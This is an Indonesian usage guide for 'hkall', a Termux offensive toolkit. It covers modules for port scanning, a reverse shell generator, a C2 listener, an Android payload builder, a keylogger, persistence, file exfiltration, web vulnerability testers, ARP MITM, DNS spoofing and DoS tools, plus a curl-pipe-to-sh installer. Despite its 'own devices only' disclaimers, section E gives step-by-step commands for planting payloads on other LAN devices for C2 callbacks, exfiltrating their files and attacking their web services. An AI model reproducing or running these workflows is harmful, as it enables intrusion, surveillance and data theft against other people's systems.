# hkall — Panduan Lengkap (Menu → Input → Auto)

Semua modul: **uji device/network milik sendiri saja.** Lab server tersedia di `lab/lab_server.py`.
Alur umum (TUI): `hkall` → menu numbered → pilih modul → jawab prompt → hasil tersimpan ke `data/rs.db`
`hkall -m history` untuk lihat.

---

## 0. Global `hkall` command + lab

```bash
# 1x install global (Termux: pkg install; lain: cukup python3)
curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh
# atau ikut langkah manual di README

hkall                # TUI menu
hkall -m scan -h     # per-module flags help
hkall --list         # semua modul (29 + plugin)
hkall --search sql   # filter

# lab server (target latihan, di device sendiri, bind 127.0.0.1)
python3 lab/lab_server.py 8090

# completion (sekali, di ~/.bashrc / ~/.zshrc)
source $HOME/hkall/bin/hkall-completion.bash
```

TUI: `/query` filter, `i N` info modul, `N` jalankan, `0`/`q` keluar.

---

## A. Modul bawaan (`hkall.py`) — 20 modul

### recon
| modul | fungsi | contoh |
|-------|--------|--------|
| scan | port scanner + banner | `hkall -m scan --host 127.0.0.1 --ports 1-1000` |
| enum | web enumerator (header/mail/secret/form) | `hkall -m enum --host http://127.0.0.1:8090` |
| whois | DNS lookup | `hkall -m whois --host example.com` |
| subd | subdomain brute | `hkall -m subd --host example.com` |
| lan | LAN host discoverer | `hkall -m lan --host 192.168.1.0/24` |
| arp | ARP scan (root) | `hkall -m arp --host 192.168.1.0/24` |

### shells
| modul | fungsi | contoh |
|-------|--------|--------|
| shell | reverse shell generator | `hkall -m shell --host 192.168.1.5 --port 4444` |
| c2 | C2 listener multi-session | `hkall -m c2 --port 4444` |
| payload | Android payload builder | `hkall -m payload --host 1.2.3.4 --port 8443` |
| exe2 | shell payload variants | `hkall -m exe2 --host 1.2.3.4 --port 4444` |
| keylog | keylogger | `hkall -m keylog` |

### exfil
| modul | fungsi | contoh |
|-------|--------|--------|
| exfil | kirim file | `hkall -m exfil --host 192.168.1.5 --port 12345 --file a.txt` |
| recv | terima file | `hkall -m recv --port 12345` |

### device / misc
| modul | fungsi | contoh |
|-------|--------|--------|
| wifi | wifi audit (termux-api) | `hkall -m wifi` |
| persist | persistence boot+hook | `hkall -m persist` |
| ops | device ops (termux-api) | `hkall -m ops` |
| serve | HTTP static server | `hkall -m serve` |
| spray | web form credential spray | `hkall -m spray --host http://127.0.0.1:8090` |
| cfg | config/preset | `hkall -m cfg` |
| history | hasil tersimpan | `hkall -m history --limit 10 --kind scan` |

---

## B. Modul plugin `websec` — 8 modul (lab)

Semua uji **device sendiri** (pakai `lab/lab_server.py`).

| modul | fungsi | contoh (CLI one-shot) |
|-------|--------|----------------------|
| sqli | SQLi tester (16 payload) | `hkall -m sqli --host "http://127.0.0.1:8090/sqli?x=1"` |
| xss | XSS reflection check | `hkall -m xss --host "http://127.0.0.1:8090/xss?q="` |
| csrf | CSRF check (SameSite+token) | `hkall -m csrf --host http://127.0.0.1:8090/act` |
| idor | IDOR enumeration | `hkall -m idor --host "http://127.0.0.1:8090/user/{{id}}" --range 20 --auth "Bearer x"` |
| mitm | ARP MITM lab (root) | `hkall -m mitm --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0` |
| netcut | Cut internet target (root, netcut-like) | `hkall -m netcut --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0 --seconds 10` |
| dnsspoof | DNS spoof lab (root) | `hkall -m dnsspoof --domain test.lab --ip 127.0.0.1` |
| ddos | load test (bounded) | `hkall -m ddos --host http://127.0.0.1:8090/load` |
| websec | orchestrator menu (chain) | `hkall -m websec` |

### websec orchestrator
```
hkall -m websec
  [category] 1=web 2=network 3=load
  [web] a=sqli b=xss c=csrf d=idor, atau "auto" (chain a→b→c→d)
  [target] url device sendiri
```

---

## C. Modul plugin `toolbox` — eksternal tool (18 tool)

`hkall -m toolbox` → menu kategori → pilih tool → kalau binary belum ada, tawarkan `pkg install`
(dengan cek repo, konfirmasi dulu). Katalog: `tools.json`.

| kategori | tool | fungsi | root |
|----------|------|--------|------|
| web | sqlmap | SQLi auto | tidak |
| web | ffuf | web fuzz (path/param) | tidak |
| web | mitmproxy | HTTPS MITM proxy (CA di device sendiri) | transparent mode |
| web | dalfox | XSS fuzzer (Go) | tidak |
| web | xsstrike | XSS deteksi + filter bypass (pip) | tidak |
| web | feroxbuster | path/content fuzz (Rust) | tidak |
| net | bettercap | MITM framework (arp/dns/sslstrip) | ya |
| net | dnschef | fake DNS proxy (pip) | ya |
| net | tcpdump | packet capture | ya |
| net | tshark | packet analysis | ya |
| net | hping3 | packet crafting/flood (lab) | ya |
| net | dnsmasq | fake DNS via hosts | tidak (pakai -p 5353) |
| net | dsniff | arpspoof/dnsspoof/macof | ya |
| net | macchanger | MAC spoof | ya |
| net | responder | NBNS/LLMNR/mDNS poison (Linux/own net) | ya |
| recon | nmap | port/service scan | tidak |
| auth | hydra | login brute (own service) | tidak |
| load | ab | ApacheBench | tidak |
| load | siege | load test | tidak |
| load | wrk | HTTP benchmark | tidak |
| load | goldeneye | HTTP DoS (lab-only) | tidak |

Guide-only (bukan launcher CLI): `mhddos` (pip source), `loic` (GUI .NET), `ettercap` (bukan di
Termux repo) — cara pakai & tata letaknya di bawah.

### Tool guide-only / manual build
- **dalfox** — Go: `go install github.com/hahwul/dalfox/v2@latest`; `dalfox url http://DEVICE/xss?q=FUZZ`
- **xsstrike** — pip: `pip install xsstrike`  →  `xsstrike -u http://DEVICE/xss?q=param`
- **feroxbuster** — cargo: `cargo install feroxbuster` → `feroxbuster -u http://DEVICE -w subd.txt -x php`
- **responder** — pip: `pip install responder` → `responder -I wlan0 -wv` (own network lab; hati-hati LLMNR)
- **mhddos** — pip: `pip install mhddos` → `python -m mhdos` (load test own service; 88 mode, set kecil)
- **loic** — GUI .NET, pakai manual interface (bukan Terminal) — tab New Target → URL → IMMA FIRIN MAH LAZOR
- **ettercap** — hanya build source di Linux (bukan Termux); pakai bettercap/arpspoof sebagai ganti

Status terpasang device ini: `tshark`, `mitmdump` (mitmproxy). Sisanya offer install saat dipilih.
Contoh pakai toolbox:
```
hkall -m toolbox
  > 1 (web)  > 1 (sqlmap)  > install? [n/y]
  > target url (device) ...
  > apakah sudah install? kalau belum, jawab y
```

---

## D. Alur belajar lengkap (device sendiri)

1. Nyalakan lab:
   ```
   python3 lab/lab_server.py 8090
   ```
2. Satu per satu (lihat tabel B), atau sekaligus:
   ```
   hkall -m sqli  --host "http://127.0.0.1:8090/sqli?x=1"
   hkall -m xss   --host "http://127.0.0.1:8090/xss?q="
   hkall -m csrf  --host "http://127.0.0.1:8090/act"
   hkall -m idor  --host "http://127.0.0.1:8090/user/{{id}}" --range 5
   hkall -m ddos  --host "http://127.0.0.1:8090/load"
   ```
3. Cek hasil:
   ```
   hkall -m history --limit 20
   ```

Hasil yang diharapkan (lab server vuln):
- sqli → banyak `[check]` status 500 vs 200
- xss → `reflected raw: [<script>alert(1)</script>, ...]` (6 payload reflected)
- csrf → `verdict: review` (no SameSite, no token)
- idor → `accessible ids: [(1,200),(2,200),(3,200)]` (4-5 404)
- ddos → `done in ~10s: ... req/s`

---

## E. Menarget device lain (LAN/network sendiri)

Semua modul target (`scan`, `enum`, `sqli`, `xss`, `csrf`, `idor`, `spray`, `ddos`, `whois`, `subd`,
`lan`, `arp`, `exfil`, `serve`) **menerima IP/URL bebas** — bukan cuma localhost. Tinggal ganti
`127.0.0.1` dengan IP device lain di network kamu.

Persyaratan: target reachable dari device ini (LAN WiFi yang sama / subnet yang dapat dilewati).
Cek dulu dengan `ping` atau `hkall -m scan --host <IP> --ports 22,80,443`.

### Alur remote recon (device lain)
```bash
# 1. temukan IP device lain
hkall -m lan --host 192.168.1.0/24          # host up
hkall -m arp --host 192.168.1.0/24          # MAC+IP (root)

# 2. scan port + service
hkall -m scan --host 192.168.1.20 --ports 1-1000

# 3. kalau ada web service, uji web vuln langsung ke sana
hkall -m sqli --host "http://192.168.1.20/app?x=1"
hkall -m xss  --host "http://192.168.1.20/search?q="
hkall -m csrf --host "http://192.168.1.20/account/change"
hkall -m idor --host "http://192.168.1.20/api/user/{{id}}" --range 20
```

### Alur C2 ke device lain (target menjalankan payload)
Device lain = agen; device ini = listener.
```bash
# di device ini (attacker):
hkall -m shell --host $(IP device ini) --port 4444   # dapat one-liner
# atau build payload:
hkall -m payload --host $(IP device ini) --port 8443   # -> data/payload.py
# taruh payload/one-liner ke device lain (jalankan manual di sana)

# di device ini: buka listener
hkall -m c2 --port 4444
# payload di device lain connect balik -> session muncul
```

### Alur exfil dari device lain
```bash
# di device ini (attacker): server penerima
hkall -m recv --port 12345
# di device lain: kirim file
hkall -m exfil --host <IP device ini> --port 12345 --file secret.txt
```

### Catatan lokal-only (bukan untuk remote)
`keylog`, `persist`, `ops`, `wifi`, `mitm`, `dnsspoof` — jalan **di tempat tool dijalankan**:
keylog/ops/wifi pakai device sendiri; mitm/dnsspoof butuh root dan menyasar device lain di LAN
(ARP/DNS), tapi prosesnya tetap di device ini. Bukan "target execute payload".

## F. Struktur menu

| kategori | modul |
|----------|-------|
| recon | scan, enum, whois, subd, lan, arp, nmap(toolbox) |
| shells | shell, c2, payload, exe2, keylog |
| exfil | exfil, recv |
| web vuln | sqli, xss, csrf, idor, spray, ffuf(toolbox), sqlmap(toolbox) |
| network attack | mitm, netcut, dnsspoof, bettercap, dnschef, dnsmasq, dsniff, hping3 |
| load test | ddos, ab, siege, wrk, goldeneye |
| misc | wifi, persist, ops, serve, cfg, history, websec, toolbox |

Batas aman tetap: semua target device sendiri, mitm/dnsspoof butuh root + restore otomatis.
